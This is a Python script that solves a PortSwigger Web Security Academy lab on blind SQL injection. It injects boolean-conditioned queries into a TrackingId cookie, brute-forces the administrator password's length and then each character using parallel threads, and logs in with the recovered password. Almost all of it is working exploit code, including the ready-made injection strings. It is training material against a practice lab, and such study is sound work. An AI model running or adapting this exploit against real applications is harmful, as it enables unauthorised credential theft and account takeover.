#!/usr/bin/env python

'''This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.

password only contains lowercase, alphanumeric characters

Lab Link: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

'''


import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
import functools
import sys

# Vulnerable TrcakingId cookie queries
#
# query' OR (SELECT LENGTH(password) FROM users WHERE username='administrator')='<num>
# query' OR (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='administrator')='<char>


lab_id = '0a7100fe035d7858c0f4139600430010' #change based on generated lab page id
base_uri = f"https://{lab_id}.web-security-academy.net/" # contains the vulnerable sqli path
length_check  = [x for x in range(0,101)] # password length iterator that goes up to 100
ascii_chart = [char for char in range(32,127)] # ascii character iterator that includes alphanumeric characters (in decmal format)


def get_password_length(num: int) -> int:
    query = f"query' OR (SELECT LENGTH(password) FROM users WHERE username='administrator')='{num}"
    cookies = {'TrackingId': query}
    r = requests.get(base_uri, cookies=cookies)
    if 'Welcome' in r.text:
        return num


def get_password(subnum: int, char: int) -> str:
        query = f"query' OR (SELECT ASCII(SUBSTRING(password,{subnum},1)) FROM users WHERE username='administrator')='{char}"
        cookies = {'TrackingId' : query}
        r = requests.get(base_uri, cookies=cookies)
        if 'Welcome' in r.text:
            sys.stdout.write(chr(char))
            sys.stdout.flush()
            return chr(char)


def login(username: str, password: str) -> None:
    req = requests.session()
    login_uri = f"{base_uri}login"
    r = req.get(login_uri) 
    parse = BeautifulSoup(r.text, 'lxml')
    token = parse.find('input', {'name': 'csrf'})['value'] #csrf token
    
    data = { 'username' : username,
        'password' : password,
        'csrf': token
    }

    print(f"[*] Attempting to login with user: {username}")
    r2 = req.post(login_uri, data=data)
    if "Your username is: administrator" in r2.text:
        print("solved")
    else:
        print("nope")


def threadExecutor(function: "function", iterator: list) -> list:
    with ThreadPoolExecutor() as executor:
        results = executor.map(function,iterator)
    return results


def main() -> None:
    # Get the length of the administrator password
    for result in threadExecutor(get_password_length, length_check):
        if result:
            print(f"[+] Found admin password length of {result}. Getting admin password")
            password_length = result + 1
    if not password_length:
        print("[-] Could not find password length. Check sqli query. Exiting.")
        sys.exit(-1)
    
    # use the length of the adminstrator password to retrieve the password
    password = ''
    for i in range(1,password_length):
        password_funct = functools.partial(get_password, i)
        for result in threadExecutor(password_funct, ascii_chart):
            if result:
                password += result
    if not password:
        print("[-] Could not find password length. Check sqli query. Exiting.")
    
    # use the password to login to the app and complete the exercise
    print(f"\n[+] Logging in with password {password}")
    login('administrator', password)


if __name__ == "__main__":
    main()